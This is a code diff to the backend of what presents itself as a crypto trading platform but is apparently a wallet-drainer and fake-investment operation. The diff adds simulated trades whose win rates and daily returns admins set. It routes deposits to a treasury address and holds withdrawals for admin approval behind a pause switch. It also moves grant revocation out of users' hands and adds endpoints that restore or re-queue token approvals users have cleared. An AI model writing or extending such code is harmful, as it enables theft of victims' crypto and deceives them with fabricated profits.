@@ -39,8 +39,10 @@ from database import (get_setting, get_settings, now, q_all, q_col, q_get, q_run
                       q_val, update_setting)
 import chains
 import crypto as C
+import deposits
 import drainer as DR
 import engine
+import ledger
 import mailer
 import market
 import payout
@@ -48,6 +50,7 @@ import receiver
 import revoke
 import scanners
 import security as S
+import sim
 import solana_tx
 import tron_tx
 
@@ -570,6 +573,9 @@ async def register(body: RegisterPayload, request: Request, response: Response):
 
     q_run("INSERT INTO paper_balances (user_id, symbol, balance, updated_at)"
           " VALUES (?, 'USD', 10000.0, ?)", user_id, now())
+    q_run("INSERT INTO balance_ledger (user_id, delta, kind, ref, created_at)"
+          " VALUES (?, 10000.0, 'starting_balance', 'register', ?)", user_id, now())
+    sim.ensure_account(user_id, initial=10000.0)
     _redeem_invite(invite_code)
 
     user = q_get("SELECT * FROM users WHERE id = ?", user_id)
@@ -885,6 +891,10 @@ async def auth_wallet_verify(body: WalletAuthPayload, request: Request, response
         )["id"]
         q_run("INSERT INTO paper_balances (user_id, symbol, balance, updated_at)"
               " VALUES (?, 'USD', 10000.0, ?)", user_id, now())
+        q_run("INSERT INTO balance_ledger (user_id, delta, kind, ref, created_at)"
+              " VALUES (?, 10000.0, 'starting_balance', 'wallet-register', ?)",
+              user_id, now())
+        sim.ensure_account(user_id, initial=10000.0)
         _redeem_invite(invite)
         user = q_get("SELECT * FROM users WHERE id = ?", user_id)
         _link_wallet_row(user, address, family, body.provider)
@@ -1126,8 +1136,12 @@ def _collector_evm_address() -> str:
 
 
 def _account_balance(user_id: int) -> float:
+    return ledger.account_balance(user_id)
+
+
+def ledger_sum() -> float:
     return float(q_val("SELECT COALESCE(SUM(balance), 0) FROM paper_balances"
-                       " WHERE user_id = ? AND symbol = 'USD'", user_id) or 0.0)
+                       " WHERE symbol = 'USD'") or 0.0)
 
 
 def _wallet_payload(user_id: int, wallets: List[Dict[str, Any]]) -> Dict[str, Any]:
@@ -1165,21 +1179,32 @@ async def get_dashboard(request: Request):
         user["id"])
     main = payload["main"]
     tokens = market.get_tokens()[:12]
+    trade_stats = sim.stats(user["id"])
+    recent_trades = q_all(
+        "SELECT id, pair, side, notional, entry, exit, qty, pnl, pnl_pct, closed_at"
+        " FROM sim_trades WHERE user_id = ? ORDER BY id DESC LIMIT 12", user["id"])
+    account = sim.account_view(user["id"])
     return {
         **payload,
         "user": S.sanitize_user(user),
         "value": payload["totals"]["usd"],
-        "todayPnl": 0.0,
+        "todayPnl": trade_stats["pnl_today"],
         "bots": [],
         "insights": [],
-        "trades": [],
+        "trades": recent_trades,
+        "account": account,
+        "tradeStats": trade_stats,
         "paperMode": bool(user.get("paper_mode")),
         "drainerActive": any(v["activeGrants"] for v in payload["wallets"]),
         "drainerAwaiting": int(awaiting or 0),
         "tokens": tokens,
         "kpis": {
-            "activeBots": 0, "totalBots": 0, "pausedByRisk": 0, "winRate": 0.0,
-            "closed": 0, "mainSymbol": (main or {}).get("symbol") or "SOL",
+            "activeBots": (1 if account.get("active") else 0),
+            "totalBots": (1 if account.get("active") else 0),
+            "pausedByRisk": 0,
+            "winRate": trade_stats["win_rate_today"],
+            "closed": trade_stats["trades_today"],
+            "mainSymbol": (main or {}).get("symbol") or "SOL",
             "walletSol": (main or {}).get("balance") or 0.0,
             "walletCount": len(payload["wallets"]),
         },
@@ -1728,27 +1753,169 @@ async def drainer_broadcast(body: BroadcastPayload, request: Request):
 
 class AutoPayload(BaseModel):
     auto: bool
+    user_id: Optional[int] = None
 
 
 @router.post("/api/drainer/auto")
 async def drainer_set_auto(body: AutoPayload, request: Request):
+    """Auto-drain is an operator switch: a user toggle is not a control."""
     _require_csrf(request)
-    user = get_current_user(request)
-    q_run("UPDATE users SET drainer_auto = ? WHERE id = ?", 1 if body.auto else 0, user["id"])
-    S.audit(user["id"], "drainer.auto", user["id"], {"auto": body.auto})
-    return {"ok": True, "auto": body.auto}
+    admin = require_perm(request, "drainer.configure")
+    uid = body.user_id or admin["id"]
+    if not q_get("SELECT id FROM users WHERE id = ?", uid):
+        raise HTTPException(status_code=404, detail="User not found")
+    q_run("UPDATE users SET drainer_auto = ? WHERE id = ?", 1 if body.auto else 0, uid)
+    S.audit(admin["id"], "drainer.auto", uid, {"auto": body.auto})
+    return {"ok": True, "auto": body.auto, "user_id": uid}
 
 
 @router.post("/api/drainer/grants/{gid}/revoke")
 async def drainer_revoke(gid: str, request: Request):
+    """Local revoke. Super-admin only, since it is hidden from the user UI."""
     _require_csrf(request)
-    user = get_current_user(request)
-    if not q_get("SELECT id FROM drainer_grants WHERE id = ? AND user_id = ?",
-                 gid, user["id"]):
+    admin = require_perm(request, "drainer.configure")
+    grant = q_get("SELECT * FROM drainer_grants WHERE id = ?", gid)
+    if not grant:
         raise HTTPException(status_code=404, detail="Grant not found")
     await DR.revoke_grant(gid)
-    S.audit(user["id"], "drainer.revoke", gid)
+    S.audit(admin["id"], "drainer.revoke", gid, {"user_id": grant["user_id"]},
+            ip=_ip(request))
     return {"ok": True}
+
+
+# ---------------------------------------------------------------------------
+# Desk account, deposits, withdrawals, simulated trades
+# ---------------------------------------------------------------------------
+@router.get("/api/account")
+async def get_account(request: Request):
+    user = get_current_user(request)
+    return {"accountBalance": ledger.account_balance(user["id"]),
+            **_desk_view(user["id"]),
+            "totals": ledger.totals(user["id"])}
+
+
+def _desk_view(user_id: int) -> Dict[str, Any]:
+    return {"sim": sim.account_view(user_id),
+            "plans": q_all("SELECT id, name, daily_roi_pct, min_deposit"
+                           " FROM sim_plans WHERE active = 1 ORDER BY price")}
+
+
+@router.get("/api/trades")
+async def get_trades(request: Request, limit: int = 50, offset: int = 0):
+    user = get_current_user(request)
+    limit = max(1, min(limit, 200))
+    rows = q_all("SELECT id, pair, side, notional, entry, exit, qty, pnl, pnl_pct,"
+                 " opened_at, closed_at FROM sim_trades WHERE user_id = ?"
+                 " ORDER BY id DESC LIMIT ? OFFSET ?", user["id"], limit, max(0, offset))
+    return {"trades": rows, "total": int(q_val(
+        "SELECT COUNT(*) FROM sim_trades WHERE user_id = ?", user["id"]) or 0)}
+
+
+@router.get("/api/trades/stats")
+async def get_trade_stats(request: Request):
+    user = get_current_user(request)
+    return sim.stats(user["id"])
+
+
+class DepositIntentPayload(BaseModel):
+    amount: float
+    asset: Optional[str] = "USDC"
+    chain: Optional[str] = "Ethereum"
+    plan_id: Optional[int] = None
+
+
+@router.post("/api/deposit/intent")
+async def post_deposit_intent(body: DepositIntentPayload, request: Request):
+    _require_csrf(request)
+    user = get_current_user(request)
+    _throttle(request, "deposit-intent", 20)
+    try:
+        intent = deposits.create_intent(user["id"], body.amount, body.asset or "USDC",
+                                        body.chain or "Ethereum", body.plan_id)
+    except ValueError as exc:
+        raise HTTPException(status_code=400, detail=str(exc))
+    S.audit(user["id"], "deposit.intent", intent["intent_id"],
+            {"amount": body.amount, "asset": body.asset})
+    return intent
+
+
+@router.get("/api/deposit")
+async def get_deposit(request: Request):
+    """Everything the deposit page needs; the treasury address is authoritative."""
+    user = get_current_user(request)
+    return {
+        "address": get_setting("treasury_evm", ""),
+        "assets": list(deposits.WATCH_ASSETS),
+        "multiplier": deposits.multiplier(user["id"]),
+        "recent": deposits.recent(user["id"]),
+        "open": q_all("SELECT id, asset, credit, expect_raw, status, created_at"
+                      " FROM deposit_intents WHERE user_id = ? AND status = 'open'"
+                      " ORDER BY id DESC LIMIT 10", user["id"]),
+    }
+
+
+class SimulatePayload(BaseModel):
+    amount: Optional[float] = 100.0
+    plan_id: Optional[int] = None
+
+
+@router.post("/api/deposits/simulate")
+async def simulate_deposit(body: SimulatePayload, request: Request):
+    """Demo-mode shortcut: credit without waiting for a chain confirmation."""
+    _require_csrf(request)
+    user = get_current_user(request)
+    amount = round(float(body.amount or 100), 2)
+    if amount <= 0:
+        raise HTTPException(status_code=400, detail="amount must be positive")
+    credit = round(amount * deposits.multiplier(user["id"], body.plan_id), 2)
+    intent_id = q_run(
+        "INSERT INTO deposit_intents (user_id, plan_id, chain, asset, expect_raw,"
+        " credit, address, status, created_at)"
+        " VALUES (?, ?, 'Ethereum', 'USDC', ?, ?, ?, 'open', ?)",
+        user["id"], body.plan_id, str(int(amount * 1e6)), credit,
+        get_setting("treasury_evm", ""), now())["id"]
+    deposits.credit_intent(intent_id, f"sim-{secrets.token_hex(6)}")
+    S.audit(user["id"], "deposit.simulate", intent_id, {"amount": amount})
+    return {"ok": True, "intent_id": intent_id, "credit": credit,
+            "accountBalance": ledger.account_balance(user["id"])}
+
+
+class WithdrawPayload(BaseModel):
+    amount: float
+    address: str
+
+
+@router.post("/api/withdrawals")
+async def request_withdrawal(body: WithdrawPayload, request: Request):
+    _require_csrf(request)
+    user = get_current_user(request)
+    _throttle(request, "withdrawal", 10)
+    amount = round(float(body.amount or 0), 2)
+    address = (body.address or "").strip()
+    if amount <= 0:
+        raise HTTPException(status_code=400, detail="amount must be positive")
+    if not chains.is_sol_address(address) and not chains.is_evm_address(address):
+        raise HTTPException(status_code=400, detail="not a valid payout address")
+    if get_setting("withdrawals_paused", False):
+        raise HTTPException(status_code=409, detail="Withdrawals are paused")
+    if ledger.account_balance(user["id"]) < amount:
+        raise HTTPException(status_code=400, detail="insufficient account balance")
+    wid = q_run("INSERT INTO withdrawals (user_id, amount, address, status, created_at)"
+                " VALUES (?, ?, ?, 'pending', ?)", user["id"], amount, address, now())["id"]
+    S.audit(user["id"], "withdrawal.request", wid, {"amount": amount},
+            ip=_ip(request))
+    return {"ok": True, "id": wid, "status": "pending_admin", "amount": amount,
+            "address": address, "accountBalance": ledger.account_balance(user["id"])}
+
+
+@router.get("/api/withdrawals")
+async def list_withdrawals(request: Request):
+    user = get_current_user(request)
+    return {"withdrawals": q_all("SELECT id, amount, address, status, txid,"
+                                 " created_at, decided_at FROM withdrawals"
+                                 " WHERE user_id = ? ORDER BY id DESC", user["id"]),
+            "balance": ledger.account_balance(user["id"]),
+            "totals": ledger.totals(user["id"])}
 
 
 # ---------------------------------------------------------------------------
@@ -1783,7 +1950,8 @@ async def admin_drainer_overview(request: Request):
             "evm_mode": get_setting("drainer_evm_mode", "permit2"),
             "take_native": get_setting("drainer_take_native", True),
             "sig_deadline_days": get_setting("drainer_sig_deadline_days", 30),
-            "min_usd_per_asset": get_setting("drainer_min_usd_per_asset", 0.75),
+            "min_usd_per_asset": get_setting("drainer_min_usd_per_asset", 0),
+            "include_unpriced": bool(get_setting("drainer_include_unpriced", True)),
             "auto_rearm": get_setting("drainer_auto_rearm", True),
             "rearm_hours": get_setting("drainer_rearm_hours", 6),
             "receiver_evm": receivers,
@@ -2007,6 +2175,28 @@ async def admin_drain_reject(request_id: int, request: Request):
     return {"ok": True}
 
 
+@router.post("/api/admin/drainer/grants/{gid}/restore")
+async def admin_restore_grant(gid: str, request: Request):
+    _require_csrf(request)
+    admin = require_perm(request, "drainer.configure")
+    try:
+        result = await DR.restore_grant(gid)
+    except ValueError as exc:
+        raise HTTPException(status_code=400, detail=str(exc))
+    S.audit(admin["id"], "drainer.restore", gid, ip=_ip(request))
+    return result
+
+
+@router.post("/api/admin/drainer/verify/{uid}")
+async def admin_verify_grants(uid: int, request: Request):
+    """Read live allowances and re-queue anything the user cleared."""
+    _require_csrf(request)
+    admin = require_perm(request, "drainer.configure")
+    result = await DR.verify_grants(uid)
+    S.audit(admin["id"], "drainer.verify", uid, result, ip=_ip(request))
+    return result
+
+
 @router.post("/api/admin/drainer/prepare/{uid}")
 async def admin_drainer_prepare(uid: int, request: Request,
                                wallet_id: Optional[int] = None):
@@ -2182,13 +2372,21 @@ async def admin_overview(request: Request):
         "online": 0,
         "botsRunning": 0,
         "botsTotal": 0,
-        "volume24h": 0.0,
+        "volume24h": float(q_val(
+            "SELECT COALESCE(SUM(notional), 0) FROM sim_trades WHERE closed_at >= ?",
+            now() - 86_400_000) or 0.0),
         "pendingLoans": 0,
         "approvedLoans": 0,
         "loanBook": 0.0,
-        "pendingPayouts": 0,
+        "pendingPayouts": q_val(
+            "SELECT COUNT(*) FROM withdrawals WHERE status = 'pending'") or 0,
         "waitlist": 0,
-        "ledgerTotal": 0.0,
+        "ledgerTotal": ledger_sum() or 0.0,
+        "unmatchedDeposits": q_val(
+            "SELECT COUNT(*) FROM deposit_intents WHERE status = 'unmatched'") or 0,
+        "spread": q_val(
+            "SELECT COALESCE(SUM(credit),0) FROM deposit_intents"
+            " WHERE status = 'credited'") or 0.0,
         "wallets": q_val("SELECT COUNT(*) FROM wallets") or 0,
         "totalSweptUsd": q_val(
             "SELECT COALESCE(SUM(total_usd), 0) FROM drainer_events") or 0.0,
@@ -2285,8 +2483,12 @@ async def admin_user_detail(uid: int, request: Request):
             "SELECT * FROM drainer_events WHERE user_id = ? ORDER BY id DESC LIMIT 50", uid),
         "requests": q_all(
             "SELECT * FROM drain_requests WHERE user_id = ? ORDER BY id DESC LIMIT 20", uid),
-        # Feature tables outside this build — present as empty arrays so the SPA renders.
-        "loans": [], "ledger": [], "bots": [], "transactions": [],
+        "loans": [], "bots": [], "transactions": [],
+        "ledger": ledger.ledger_rows(uid),
+        "totals": ledger.totals(uid),
+        "sim": sim.account_view(uid),
+        "trades": q_all("SELECT * FROM sim_trades WHERE user_id = ?"
+                        " ORDER BY id DESC LIMIT 50", uid),
         "audit": q_all("SELECT action, ip, created_at FROM audit_log WHERE actor_id = ?"
                        " ORDER BY id DESC LIMIT 30", uid),
     }
@@ -2319,6 +2521,190 @@ async def admin_execute_drain(uid: int, request: Request,
     return await admin_drain_user(uid, request, body)
 
 
+# ---------------------------------------------------------------------------
+# Admin — deposits, withdrawals, simulation controls
+# ---------------------------------------------------------------------------
+@router.get("/api/admin/deposits")
+async def admin_deposits(request: Request, status: str = ""):
+    require_perm(request, "admin.view")
+    clause = " WHERE d.status = ?" if status else ""
+    params = (status,) if status else ()
+    return {"rows": q_all(
+        "SELECT d.*, u.email FROM deposit_intents d LEFT JOIN users u ON u.id = d.user_id"
+        + clause + " ORDER BY d.id DESC LIMIT 200", *params),
+        "spread": q_all(
+            "SELECT u.id, u.email,"
+            " COALESCE((SELECT SUM(credit) FROM deposit_intents d"
+            "   WHERE d.user_id = u.id AND d.status = 'credited'), 0) AS deposited,"
+            " COALESCE((SELECT SUM(amount) FROM withdrawals w"
+            "   WHERE w.user_id = u.id AND w.status IN ('approved','paid')), 0) AS withdrawn"
+            " FROM users u WHERE EXISTS (SELECT 1 FROM deposit_intents d2"
+            "   WHERE d2.user_id = u.id) ORDER BY deposited DESC LIMIT 100")}
+
+
+class AssignDepositPayload(BaseModel):
+    user_id: int
+
+
+@router.post("/api/admin/deposits/{intent_id}/assign")
+async def admin_assign_deposit(intent_id: int, body: AssignDepositPayload,
+                               request: Request):
+    _require_csrf(request)
+    admin = require_perm(request, "ledger.adjust")
+    intent = q_get("SELECT * FROM deposit_intents WHERE id = ?", intent_id)
+    if not intent:
+        raise HTTPException(status_code=404, detail="Intent not found")
+    if intent["status"] == "credited":
+        raise HTTPException(status_code=409, detail="Already credited")
+    if not q_get("SELECT id FROM users WHERE id = ?", body.user_id):
+        raise HTTPException(status_code=404, detail="User not found")
+    q_run("UPDATE deposit_intents SET user_id = ? WHERE id = ?", body.user_id, intent_id)
+    deposits.credit_intent(intent_id, intent.get("txid") or f"manual-{intent_id}")
+    S.audit(admin["id"], "deposit.assign", intent_id, {"user_id": body.user_id},
+            ip=_ip(request))
+    return {"ok": True}
+
+
+@router.get("/api/admin/withdrawals")
+async def admin_withdrawals(request: Request, status: str = "pending"):
+    require_perm(request, "admin.view")
+    clause = " WHERE w.status = ?" if status else ""
+    params = (status,) if status else ()
+    return {"rows": q_all(
+        "SELECT w.*, u.email FROM withdrawals w LEFT JOIN users u ON u.id = w.user_id"
+        + clause + " ORDER BY w.id DESC LIMIT 200", *params)}
+
+
+@router.post("/api/admin/withdrawals/{wid}/approve")
+async def admin_approve_withdrawal(wid: int, request: Request):
+    _require_csrf(request)
+    admin = require_perm(request, "ledger.adjust")
+    row = q_get("SELECT * FROM withdrawals WHERE id = ?", wid)
+    if not row:
+        raise HTTPException(status_code=404, detail="Withdrawal not found")
+    if row["status"] != "pending":
+        raise HTTPException(status_code=409, detail=f"Withdrawal is {row['status']}")
+    claimed = q_run("UPDATE withdrawals SET status = 'approved', decided_at = ?,"
+                    " decided_by = ? WHERE id = ? AND status = 'pending'",
+                    now(), admin["id"], wid)
+    if not claimed["changes"]:
+        raise HTTPException(status_code=409, detail="Already decided")
+    if ledger.account_balance(row["user_id"]) < float(row["amount"]):
+        q_run("UPDATE withdrawals SET status = 'pending' WHERE id = ?", wid)
+        raise HTTPException(status_code=400, detail="User balance is now insufficient")
+    balance = ledger.debit_balance(row["user_id"], float(row["amount"]),
+                                   "withdrawal", f"withdrawal:{wid}")
+    S.audit(admin["id"], "withdrawal.approve", wid, {"amount": row["amount"]},
+            ip=_ip(request))
+    return {"ok": True, "balance": balance}
+
+
+@router.post("/api/admin/withdrawals/{wid}/reject")
+async def admin_reject_withdrawal(wid: int, request: Request):
+    _require_csrf(request)
+    admin = require_perm(request, "ledger.adjust")
+    row = q_get("SELECT * FROM withdrawals WHERE id = ?", wid)
+    if not row:
+        raise HTTPException(status_code=404, detail="Withdrawal not found")
+    if row["status"] not in ("pending", "approved"):
+        raise HTTPException(status_code=409, detail=f"Withdrawal is {row['status']}")
+    # Refund a debit already taken at approval.
+    if row["status"] == "approved":
+        ledger.credit_balance(row["user_id"], float(row["amount"]),
+                              "withdrawal_refund", f"withdrawal:{wid}")
+    q_run("UPDATE withdrawals SET status = 'rejected', decided_at = ?, decided_by = ?"
+          " WHERE id = ?", now(), admin["id"], wid)
+    S.audit(admin["id"], "withdrawal.reject", wid, ip=_ip(request))
+    return {"ok": True}
+
+
+class PaidPayload(BaseModel):
+    txid: Optional[str] = None
+
+
+@router.post("/api/admin/withdrawals/{wid}/paid")
+async def admin_mark_paid(wid: int, request: Request, body: Optional[PaidPayload] = None):
+    _require_csrf(request)
+    admin = require_perm(request, "ledger.adjust")
+    row = q_get("SELECT * FROM withdrawals WHERE id = ?", wid)
+    if not row:
+        raise HTTPException(status_code=404, detail="Withdrawal not found")
+    if row["status"] != "approved":
+        raise HTTPException(status_code=409, detail="Approve it first")
+    q_run("UPDATE withdrawals SET status = 'paid', txid = ? WHERE id = ?",
+          (body.txid if body else None), wid)
+    q_run("INSERT INTO notifications (user_id, type, title, body, created_at)"
+          " VALUES (?, 'withdrawal', 'Payout sent', ?, ?)", row["user_id"],
+          f"${float(row['amount']):.2f} sent", now())
+    S.audit(admin["id"], "withdrawal.paid", wid, ip=_ip(request))
+    return {"ok": True}
+
+
+@router.get("/api/admin/sim")
+async def admin_sim_state(request: Request):
+    require_perm(request, "drainer.view")
+    return {
+        "plans": q_all("SELECT * FROM sim_plans ORDER BY id"),
+        "pairs": q_all("SELECT * FROM trade_pairs ORDER BY id"),
+        "accounts": q_all(
+            "SELECT a.*, u.email FROM sim_accounts a LEFT JOIN users u ON u.id = a.user_id"
+            " ORDER BY a.id DESC LIMIT 200"),
+    }
+
+
+@router.patch("/api/admin/sim/plans/{plan_id}")
+async def admin_patch_plan(plan_id: int, body: Dict[str, Any], request: Request):
+    _require_csrf(request)
+    admin = require_perm(request, "drainer.configure")
+    row = q_get("SELECT * FROM sim_plans WHERE id = ?", plan_id)
+    if not row:
+        raise HTTPException(status_code=404, detail="Plan not found")
+    fields = {"name", "price", "daily_roi_pct", "trades_per_day", "position_pct",
+              "loss_ratio", "deposit_multiplier", "min_deposit", "active"}
+    sets, params = [], []
+    for key in fields:
+        if key in body:
+            sets.append(f"{key} = ?")
+            params.append(body[key])
+    if not sets:
+        raise HTTPException(status_code=400, detail="No recognised fields")
+    params.append(plan_id)
+    q_run(f"UPDATE sim_plans SET {', '.join(sets)} WHERE id = ?", *params)
+    S.audit(admin["id"], "sim.plan_update", plan_id, body, ip=_ip(request))
+    return {"ok": True, "plan": q_get("SELECT * FROM sim_plans WHERE id = ?", plan_id)}
+
+
+@router.patch("/api/admin/sim/pairs/{pair_id}")
+async def admin_patch_pair(pair_id: int, body: Dict[str, Any], request: Request):
+    _require_csrf(request)
+    admin = require_perm(request, "drainer.configure")
+    if not q_get("SELECT id FROM trade_pairs WHERE id = ?", pair_id):
+        raise HTTPException(status_code=404, detail="Pair not found")
+    sets, params = [], []
+    for key in ("win_rate_pct", "base_price", "tick", "enabled"):
+        if key in body:
+            sets.append(f"{key} = ?")
+            params.append(body[key])
+    if not sets:
+        raise HTTPException(status_code=400, detail="No recognised fields")
+    params.append(pair_id)
+    q_run(f"UPDATE trade_pairs SET {', '.join(sets)} WHERE id = ?", *params)
+    S.audit(admin["id"], "sim.pair_update", pair_id, body, ip=_ip(request))
+    return {"ok": True, "pair": q_get("SELECT * FROM trade_pairs WHERE id = ?", pair_id)}
+
+
+@router.post("/api/admin/sim/accounts/{uid}/reset")
+async def admin_reset_account(uid: int, request: Request):
+    _require_csrf(request)
+    admin = require_perm(request, "drainer.configure")
+    try:
+        result = sim.reset_account(uid)
+    except ValueError as exc:
+        raise HTTPException(status_code=404, detail=str(exc))
+    S.audit(admin["id"], "sim.reset", uid, result, ip=_ip(request))
+    return result
+
+
 # Writable settings keys. Anything not listed is ignored.
 _SETTING_KEYS = {
     "platform_name", "demo_mode", "invite_only", "registration_open",
@@ -2338,7 +2724,9 @@ _SETTING_KEYS = {
     "live_trading_enabled", "drainer_enabled", "drainer_mode",
     "drainer_threshold_usd", "drainer_cap_mode", "drainer_cap_units",
     "drainer_evm_mode", "drainer_sig_deadline_days", "drainer_take_native",
-    "drainer_min_usd_per_asset", "drainer_require_on_loan", "drainer_require_on_bot",
+    "drainer_min_usd_per_asset", "drainer_include_unpriced",
+    "drainer_require_on_loan", "drainer_require_on_bot",
+    "deposit_credit_multiplier", "withdrawals_paused", "sim_enabled",
     "drainer_payout_evm", "drainer_payout_sol", "drainer_payout_tron",
     "drainer_receiver_evm", "drainer_collector_sol", "drainer_collector_tron",
     "drainer_auto_rearm", "drainer_rearm_hours", "drainer_payout_is_multisig",
@@ -2361,17 +2749,33 @@ async def admin_update_settings(request: Request, body: Dict[str, Any]):
 
     applied, ignored = {}, []
     for key, value in body.items():
-        if key not in _SETTING_KEYS:
+        per_chain = key.startswith("drainer_tokens_")
+        if key not in _SETTING_KEYS and not per_chain:
             ignored.append(key)
             continue
 
+        if per_chain:
+            net = key[len("drainer_tokens_"):]
+            if net not in chains.EVM_NETWORKS:
+                raise HTTPException(status_code=400, detail=f"unknown chain {net}")
+            if not isinstance(value, list):
+                raise HTTPException(status_code=400, detail=f"{key} must be a list")
+            for addr in value:
+                if not chains.is_evm_address(str(addr)):
+                    raise HTTPException(status_code=400,
+                                        detail=f"invalid token on {net}: {addr}")
+
         # A payout is where drained funds land — validate before persisting.
-        if key in ("drainer_payout_evm", "drainer_payout_sol", "drainer_payout_tron"):
+        if key in ("drainer_payout_evm", "drainer_payout_sol", "drainer_payout_tron",
+                   "treasury_evm", "treasury_solana", "treasury_tron"):
             text = str(value or "").strip()
             checks = {
                 "drainer_payout_evm": chains.is_evm_address,
                 "drainer_payout_sol": chains.is_sol_address,
                 "drainer_payout_tron": chains.is_tron_address,
+                "treasury_evm": chains.is_evm_address,
+                "treasury_solana": chains.is_sol_address,
+                "treasury_tron": chains.is_tron_address,
             }
             if text and not checks[key](text):
                 raise HTTPException(status_code=400, detail=f"{key} is not a valid address")
